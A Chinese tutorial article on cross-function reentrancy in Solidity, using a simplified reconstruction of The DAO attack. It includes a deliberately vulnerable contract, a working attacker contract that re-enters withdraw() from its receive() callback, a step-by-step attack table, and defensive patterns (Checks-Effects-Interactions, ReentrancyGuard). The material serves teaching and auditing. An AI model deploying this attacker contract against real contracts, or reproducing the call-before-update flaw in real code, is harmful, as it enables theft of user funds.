target="_blank">10分钟智能合约：进阶实战</a></p>
<h2 data-id="heading-0">跨函数重入：定义、原理与经典案例</h2>
<p><strong>跨函数重入</strong>是指攻击者通过一次外部调用，<strong>递归地重新进入同一个合约的另一个函数</strong>，利用多个函数间共享的状态尚未更新的窗口期，执行非预期的操作。<br/>
这一攻击类型的<strong>标志性事件</strong>是 2016 年的 <strong>The DAO 攻击</strong>，导致约 360 万 ETH 被分叉回滚，直接促成了以太坊经典（ETC）的诞生。</p>
<hr/>
<h3 data-id="heading-1">1. 核心原理</h3>
<p>跨函数重入的根本原因与单函数重入相同：<strong>状态更新滞后于外部调用</strong>。<br/>
区别在于，重入点不再是当前函数本身，而是<strong>另一个也依赖同一状态变量的函数</strong>。</p>
<p>典型脆弱模式：</p>
<ul>
<li>合约中有 <strong>两个或以上</strong> 的函数读取/修改同一个状态变量（如 <code>balances[user]</code>）。</li>
<li>其中一个函数在<strong>状态更新前</strong>发起外部调用。</li>
<li>攻击者在该外部调用的回调中，调用另一个函数，后者读取<strong>尚未更新</strong>的状态，执行操作（如再次提款）。</li>
</ul>
<hr/>
<h3 data-id="heading-2">2. 经典示例：The DAO 攻击简化复现</h3>
<p>以下代码<strong>高度简化</strong>了 DAO 的核心逻辑，仅用于演示跨函数重入原理，并非完整复现。</p>
<pre><code class="hljs language-solidity" lang="solidity">// 有漏洞的DAO简化版
contract SimpleDAO {
    mapping(address =&gt; uint) public balances;

    // 存款
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 1️⃣ 拆分提案并提取资金（漏洞函数）
    function splitDAO(address _recipient, uint _amount) public {
        uint userBalance = balances[msg.sender];
        require(userBalance &gt;= _amount, "Insufficient balance");

        // ⚠️ 漏洞：先进行外部调用，后更新状态
        // 假设这里调用了某种奖励分发合约，触发外部回调
        (bool success, ) = _recipient.call{value: _amount}("");
        require(success, "Transfer failed");

        // 状态更新滞后
        balances[msg.sender] -= _amount;
    }

    // 2️⃣ 另一个提款函数（被重入的目标）
    function withdraw(uint _amount) public {
        require(balances[msg.sender] &gt;= _amount, "Insufficient balance");
        balances[msg.sender] -= _amount;
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
}
</code></pre>
<p><strong>攻击者合约</strong>：</p>
<pre><code class="hljs language-solidity" lang="solidity">contract Attacker {
    SimpleDAO public dao;

    constructor(address _dao) {
        dao = SimpleDAO(_dao);
    }

    // 攻击入口：先存款，再触发漏洞
    function attack() public payable {
        dao.deposit{value: 1 ether}();
        dao.splitDAO(address(this), 1 ether);  // 将收款地址设为自己
    }

    // 收到ETH时的回调
    receive() external payable {
        if (address(dao).balance &gt;= 1 ether) {
            dao.withdraw(1 ether);  // ⚠️ 跨函数重入：调用另一个函数 withdraw
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-3">3. 攻击过程详解</h3>




























































<table><thead><tr><th>步骤</th><th>操作</th><th>状态变化 / 关键点</th></tr></thead><tbody><tr><td>1</td><td>攻击者 <code>attack()</code> 调用 <code>dao.deposit(1 ETH)</code></td><td><code>balances[attacker] = 1 ETH</code></td></tr><tr><td>2</td><td>调用 <code>dao.splitDAO(attacker, 1 ETH)</code></td><td>进入漏洞函数</td></tr><tr><td>3</td><td>检查 <code>balances[attacker] ≥ 1</code> → 通过</td><td>此时余额仍为 1</td></tr><tr><td>4</td><td>向攻击者发送 1 ETH</td><td>触发攻击者的 <code>receive()</code></td></tr><tr><td>5</td><td><strong>攻击者 <code>receive()</code> 内调用 <code>dao.withdraw(1 ETH)</code></strong></td><td><strong>跨函数重入开始</strong></td></tr><tr><td>6</td><td><code>withdraw</code> 检查 <code>balances[attacker] ≥ 1</code></td><td><strong>由于 splitDAO 尚未扣款，余额仍为 1 → 通过</strong></td></tr><tr><td>7</td><td><code>withdraw</code> 扣减余额 (1 → 0)，并向攻击者发送 1 ETH</td><td>攻击者再得 1 ETH</td></tr><tr><td>8</td><td><code>withdraw</code> 执行完毕，返回 <code>splitDAO</code></td><td>继续执行原 <code>splitDAO</code></td></tr><tr><td>9</td><td><code>splitDAO</code> 执行 <code>balances[attacker] -= 1</code></td><td>此时余额已是 0，再减 1 → 下溢？在 Solidity 0.8+ 会报错，早期版本会变成 2²⁵⁶-1</td></tr><tr><td>10</td><td>攻击者可重复循环（视回调控制）</td><td>直至合约 ETH 耗尽</td></tr></tbody></table>
<p><strong>攻击效果</strong>：攻击者从最初 1 ETH 余额，最终提取出远超其实际份额的资金。</p>
<hr/>
<h3 data-id="heading-4">4. 跨函数重入 vs 其他重入类型</h3>



































<table><thead><tr><th>类型</th><th>重入目标函数</th><th>典型特征</th><th>代表案例</th></tr></thead><tbody><tr><td><strong>单函数重入</strong></td><td><strong>同一个函数</strong></td><td>函数内部递归调用自身</td><td>经典提款漏洞</td></tr><tr><td><strong>跨函数重入</strong></td><td><strong>同一合约的不同函数</strong></td><td>两个函数共享同一状态变量</td><td>The DAO 攻击</td></tr><tr><td><strong>跨合约重入</strong></td><td><strong>另一个合约的函数</strong></td><td>合约 A 调用 B，B 回调 A 的函数</td><td>多次发生于跨协议交互</td></tr><tr><td><strong>只读重入</strong></td><td><strong><code>view</code> 函数</strong></td><td>不修改状态，但读取尚未更新的数据，用于操纵其他协议</td><td>Acala aUSD 攻击</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-5">5. 防御措施</h3>
<h4 data-id="heading-6">✅ <strong>核心防御：检查-生效-交互（Checks-Effects-Interactions）</strong></h4>
<p>任何可能被外部重入的函数，都必须在外部调用<strong>之前</strong>完成所有内部状态更新。</p>
<pre><code class="hljs language-solidity" lang="solidity">function splitDAO(address _recipient, uint _amount) public {
    uint userBalance = balances[msg.sender];
    require(userBalance &gt;= _amount, "Insufficient balance");

    // ✅ 先更新状态
    balances[msg.sender] -= _amount;

    // ✅ 再执行外部调用
    (bool success, ) = _recipient.call{value: _amount}("");
    require(success, "Transfer failed");
}
</code></pre>
<h4 data-id="heading-7">✅ <strong>重入锁</strong></h4>
<p>使用 <code>ReentrancyGuard</code> 修饰符，确保在函数执行期间整个合约不可重入。<strong>注意</strong>：重入锁是全局性的，可以同时防御单函数和跨函数重入。</p>
<pre><code class="hljs language-solidity" lang="solidity">import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SimpleDAO is ReentrancyGuard {
    function splitDAO(address _recipient, uint _amount) public nonReentrant {
        // 安全
    }
    function withdraw(uint _amount) public nonReentrant {
        // 安全
    }
}
</code></pre>
<h4 data-id="heading-8">✅ <strong>最小化外部调用</strong></h4>
<p>仅在绝对必要时发起外部调用，且尽可能在函数末尾进行。若必须与外部交互，优先使用**“拉取支付”（Pull Payment）**模式，将发送资产的责任转移给用户。</p>
<hr/>
<h3 data-id="heading-9">6. 现代启示与演变</h3>
<ul>
<li><strong>重入锁已成为标准</strong>：OpenZeppelin 的 <code>ReentrancyGuard</code> 被绝大多数 DeFi 项目采用，显著降低了跨函数重入的风险。</li>
<li><strong>只读重入的新挑战</strong>：即使不修改状态，重入期间读取<strong>不一致的瞬时状态</strong>仍可能被用于操纵预言机、价格计算等，需要结合其他约束防御。</li>
<li><strong>跨合约重入仍需警惕</strong>：当多个合约协同工作时，单一合约的重入锁无法阻止另一合约的回调，需要协议级别的协调设计。</li>
</ul>
<hr/>
<h3 data-id="heading-10">总结</h3>
<p><strong>跨函数重入是重入攻击家族中极具破坏力的成员</strong>，其本质依然是<strong>状态更新滞后于外部调用</strong>，只是重入点被导向了另一个共享状态的函数。<br/>
防御跨函数重入并不需要特殊技巧——<strong>遵循 CEI 模式并配合重入锁</strong>即可一劳永逸地解决问题。然而，理解其与单函数重入的区别，有助于在审计中更敏锐地识别那些**“看似无关，实则共享状态”**的函数组合。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>